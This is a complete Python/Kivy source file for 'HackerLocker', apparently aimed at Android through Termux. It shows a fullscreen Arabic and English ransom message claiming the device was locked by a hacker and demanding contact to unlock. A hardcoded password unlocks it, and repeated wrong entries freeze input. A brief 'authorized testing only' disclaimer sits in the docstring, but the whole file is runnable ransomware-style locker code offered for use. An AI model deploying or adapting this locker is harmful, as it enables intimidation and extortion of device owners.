# -*- coding: utf-8 -*-
r"""
locker_android.py — HackerLocker for Android (Kivy fullscreen lockscreen).
"إصدار جولات الأندرويد — الهكر اليوسفي" — v1.0

FOR AUTHORIZED TESTING ONLY (own devices / pentest lab / red-team demo).

What it does:
  * Opens a borderless FULLSCREEN Kivy window on Android (or desktop with Kivy).
  * Shows an ASCII hacker logo + the ransom message.
  * Stays on top of normal apps while running (userland approximation only —
    Android kernels cannot be locked from an app).
  * Unlocks only with the correct password (SHA-256 verified).
  * 5 wrong tries -> 15 second input freeze.

Run on Android (Termux):
  pkg update && pkg upgrade
  pkg install python python-pip libsdl2 libsdl2-dev clang make
  pip install kivy
  python locker_android.py

Run on Windows/Linux desktop (same file, Kivy must be installed):
  pip install kivy          (Windows/Linux)
  python locker_android.py

Recovery if you forget the password (Android):
  * Home button / Back -> Recent apps -> close the Kivy app, or
  * pkill -f locker_android  (Termux), or uninstall the app.
"""

import hashlib
import sys

MESSAGE_AR = ("لقد تم قفل جهازك بواسطة الهكر اليوسفي\n"
              "يرجى التواصل مع الهكر لفتح جهازك")
MESSAGE_EN = ("YOUR DEVICE HAS BEEN LOCKED BY HACKER AL-YOUSEFI\n"
              "CONTACT THE HACKER TO UNLOCK YOUR DEVICE")
DEFAULT_PASSWORD = "782106202"

HEADER = r"""
     ____________
    /  _  __  _  \
   /  / \/  \/ \  \
  |  |  YOUSEFI  | |
  |  |   HACKER  | |
   \  \_/\/\/\/_/ /
    \____________/
      
"""

try:
    from kivy.app import App
    from kivy.uix.boxlayout import BoxLayout
    from kivy.uix.label import Label
    from kivy.uix.textinput import TextInput
    from kivy.uix.button import Button
    from kivy.core.window import Window
except ImportError:
    print("[!] Kivy is not installed on this device.")
    print("    Termux : pip install kivy  (after: pkg install python libsdl2 clang make)")
    print("    Desktop: python -m pip install kivy")
    sys.exit(1)

# Optional: path to an Arabic-capable font (TTF). If empty, Kivy's default
# font is used (Arabic may render as separate letters on some devices).
FONT_PATH = ""


def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode("utf-8", errors="ignore")).hexdigest()


class LockLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation="vertical", padding=20, spacing=12, **kwargs)
        self.failed = 0
        self.lockdown = False
        self.unlocked = False

        self.add_widget(Label(text=HEADER, font_name=FONT_PATH or "DejaVuSans",
                              font_size="16dp", halign="center",
                              color=(0.85, 0.2, 0.1, 1)))
        self.add_widget(Label(text=MESSAGE_AR + "\n\n" + MESSAGE_EN,
                              font_name=FONT_PATH or "DejaVuSans",
                              font_size="20dp", halign="center",
                              color=(0.95, 0.95, 0.95, 1)))

        self.pwd = TextInput(password=True, multiline=False,
                             hint_text="كلمة المرور / PASSWORD",
                             font_name=FONT_PATH or "DejaVuSans",
                             font_size="22dp", size_hint=(0.7, None),
                             height="48dp", halign="center")
        self.add_widget(self.pwd)

        self.btn = Button(text="فتح الجهاز / UNLOCK",
                          font_name=FONT_PATH or "DejaVuSans",
                          font_size="18dp", size_hint=(0.5, None),
                          height="48dp", background_color=(0.75, 0.2, 0.12, 1))
        self.btn.bind(on_release=lambda *a: self.submit())
        self.add_widget(self.btn)

        self.status = Label(text="", font_name=FONT_PATH or "DejaVuSans",
                            font_size="14dp", color=(0.9, 0.2, 0.1, 1))
        self.add_widget(self.status)

        self.pwd.bind(on_text_validate=lambda *a: self.submit())
        self.pwd.focus = True

    def submit(self):
        if self.lockdown or self.unlocked:
            return
        if hash_password(self.pwd.text) == hash_password(DEFAULT_PASSWORD):
            self.unlocked = True
            self.status.text = "UNLOCKED - closing..."
            App.get_running_app().stop()
            return

        self.failed += 1
        self.pwd.text = ""
        if self.failed >= 5:
            self.lockdown = True
            self.pwd.disabled = True
            self.btn.disabled = True
            self.status.text = "محاولات كثيرة - انتظر 15 ثانية / TOO MANY TRIES - WAIT 15s"
            from kivy.clock import Clock
            Clock.schedule_once(self._release, 15)
        else:
            self.status.text = f"كلمة المرور غير صحيحة ({self.failed}/5) / WRONG PASSWORD"

    def _release(self, _dt):
        self.lockdown = False
        self.failed = 0
        self.pwd.disabled = False
        self.btn.disabled = False
        self.status.text = ""


class HackerLockerAndroidApp(App):
    title = "HackerLocker - Android Edition"

    def build(self):
        try:
            Window.borderless = True
            Window.fullscreen = "auto"
        except Exception:
            pass
        return LockLayout()


if __name__ == "__main__":
    print("[*] HackerLocker Android Edition starting...")
    HackerLockerAndroidApp().run()
    print("[+] App closed. Device unlocked.")